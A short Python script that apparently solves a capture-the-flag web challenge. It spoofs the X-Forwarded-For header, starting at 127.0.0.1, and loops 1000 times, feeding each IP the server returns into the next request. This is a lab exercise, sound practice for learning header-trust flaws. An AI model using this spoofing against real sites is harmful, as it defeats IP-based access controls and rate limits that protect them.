import requests


#function called to make a GET request to the website
def query_again(ip):
    # originally had to convert IP to string and strip a newline off of it
    new_ip = str(ip)  
    new_ip= new_ip.strip()
    print (new_ip)
    # Modify the X-Forwarded-For header
    headers = {'X-Forwarded-For': new_ip} 
    print(headers)

    # Send a new request with the updated header
    response = session.get(url, headers=headers)
    print("Response with Updated X-Forwarded-For Header:")
    print(response.text)
    next_ip=str(response.text)
    next_ip=next_ip.strip()
    return(next_ip)
    



# Define the target URL
url = "https://hostchallenge.ctf.digital"
# Define a list of IP addresses for X-Forwarded-For
ip_address = "127.0.0.1"
# Initialize a session
session = requests.Session()
# First request with 127.0.0.1 in X-Forwarded-For header
headers = {'X-Forwarded-For': ip_address}
response = session.get(url,headers=headers)
print("Initial Response:")
print(response.text)
ip_address_from_response=str(response.text)
ip_address_address_from_response = ip_address_from_response.strip()
i=0

#make a call to the website i number of times
while (i<1000):
    ip_address_function=query_again(ip_address_from_response)
    ip_address_from_response = ip_address_function
    i=i+1

